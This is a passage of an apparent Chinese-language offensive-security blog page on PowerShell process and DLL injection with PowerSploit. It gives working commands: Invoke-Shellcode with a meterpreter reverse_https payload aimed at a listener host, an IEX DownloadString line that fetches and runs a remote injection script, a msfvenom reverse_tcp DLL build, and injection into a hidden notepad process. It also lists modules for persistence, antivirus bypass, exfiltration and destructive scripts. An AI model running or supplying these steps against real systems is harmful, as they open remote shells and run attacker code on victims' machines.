+<h3 id="进程注入">进程注入</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Start-Process</span> <span class="n">c</span><span class="err">:</span><span class="p">\</span><span class="n">windows</span><span class="p">\</span><span class="n">system32</span><span class="p">\</span><span class="n">notepad</span><span class="p">.</span><span class="n">exe</span> <span class="n">-WindowStyle</span> <span class="n">Hidden</span>
+<span class="nb">Get-Process</span>                     <span class="n">查看当前进程</span><span class="err">，</span><span class="n">记住你刚刚创建的隐藏进程ID</span>
+<span class="nb">Invoke-Shellcode</span> <span class="n">-ProcessID</span> <span class="n">2384</span> <span class="n">-Shellcode</span> <span class="p">(</span><span class="nv">$buf</span><span class="p">)</span>  <span class="nb">Invoke-Shellcode脚本注入</span>
+
+<span class="n">Powersploit</span>
+    <span class="nb">Invoke-Shellcode</span> <span class="n">-ProcessID</span> <span class="n">2384</span> <span class="n">-Payload</span> <span class="n">windows</span><span class="p">/</span><span class="n">meterpreter</span><span class="p">/</span><span class="n">reverse_https</span> <span class="n">-Lhost</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">100</span><span class="p">.</span><span class="n">129</span> <span class="n">-Lport</span> <span class="n">4444</span></code></pre></td></tr></table>
+</div>
+</div>
+<h3 id="dll注入">DLL注入</h3>
+
+<p>Invoke-DLLInjection 是DLL注入脚本<br />
+首先下载安装DLL注入脚本到目标机器</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">IEX</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s2">&#34;http://192.168.110.129/CodeExecution/Invoke-DllInjection.ps1&#34;</span><span class="p">)</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>在MSF生成DLL脚本,下载DLL使用Invoke-DLLInjection脚本实现DLL注入</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.110.129 LPORT=4444 -f dll -o /var/www/html/msf.dll</pre></td></tr></table>
+</div>
+</div>
+<p>开启一个隐藏进程来进行DLL注入</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Start-Process</span> <span class="n">c</span><span class="err">:</span><span class="p">\</span><span class="n">windows</span><span class="p">\</span><span class="n">system32</span><span class="p">\</span><span class="n">notepad</span><span class="p">.</span><span class="n">exe</span> <span class="n">-WindowStyle</span> <span class="n">Hidden</span>
+<span class="nb">Invoke-DllInjection</span> <span class="n">-ProcessID</span> <span class="n">4080</span> <span class="n">-Dll</span> <span class="p">.\</span><span class="n">msf</span><span class="p">.</span><span class="n">dll</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><a href="https://evi1cg.me/archives/chm_backdoor.html">高级组合技打造“完美” 捆绑后门 </a></p>
+
+<h1 id="0x02-将powershell脚本快速转换为bat文件">0x02 将PowerShell脚本快速转换为bat文件</h1>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">* 下载链接：https://github.com/artkond/bat-armor
+* CodeExecution 在目标主机执行代码
+* ScriptModification 在目标主机上创建或修改脚本
+* Persistence 后门脚本（持久性控制）
+* AntivirusBypass 发现杀软查杀特征
+* Exfiltration 目标主机上的信息搜集工具
+* Mayhem 蓝屏等破坏性脚本
+* Recon 以目标主机为跳板进行内网信息侦查</pre></td></tr></table>
+</div>
+</div>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-AppDomainManager-to-maintain-persistence/">https://3gstudent.github.io/3gstudent.github.io/Use-AppDomainManager-to-maintain-persistence/</a></p>
+
+<p><a href="https://rastamouse.me/2017/06/psexec-much/">https://rastamouse.me/2017/06/psexec-much/</a></p>
+
+<p><a href="https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/">https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/</a></p>
+
+<p><a href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a></p>
+
+<p><a href="http://bobao.360.cn/learning/detail/3200.html">http://bobao.360.cn/learning/detail/3200.html</a></p>
+
+<p><a href="http://wooyun.jozxing.cc/static/drops/papers-16818.html">http://wooyun.jozxing.cc/static/drops/papers-16818.html</a></p>
+
+<p><a href="http://www.labofapenetrationtester.com/">http://www.labofapenetrationtester.com/</a></p>
+
+    </div>
+
+    
+<footer class="post-footer">
+      
+      <nav class="post-nav">
+        <a class="prev" href="/post/powershell-meterpreter-tips/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">Powershell-meterpreter-tips</span>
+            <span class="prev-text nav-mobile">Prev</span>
+          </a>
+        <a class="next" href="/post/uac-attack/">
+            <span class="next-text nav-default">UAC攻击剖析</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+<script type="text/javascript" src="/dist/even.ae3e3272.min.js"></script>
+  <script type="text/javascript">
+    window.MathJax = {
+      tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]},
+      showProcessingMessages: false,
+      messageStyle: 'none'
+    };
+  </script>
+  <script async src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/MathJax.js?config=TeX-MML-AM_CHTML"  integrity="sha256-nvJJv9wWKEm88qvoQl9ekL2J+k/RWIsaSScxxlsrv8k=" crossorigin="anonymous"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-153178075-1', 'auto');
+	ga('set', 'anonymizeIp', true);
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+
+</body>
+</html>
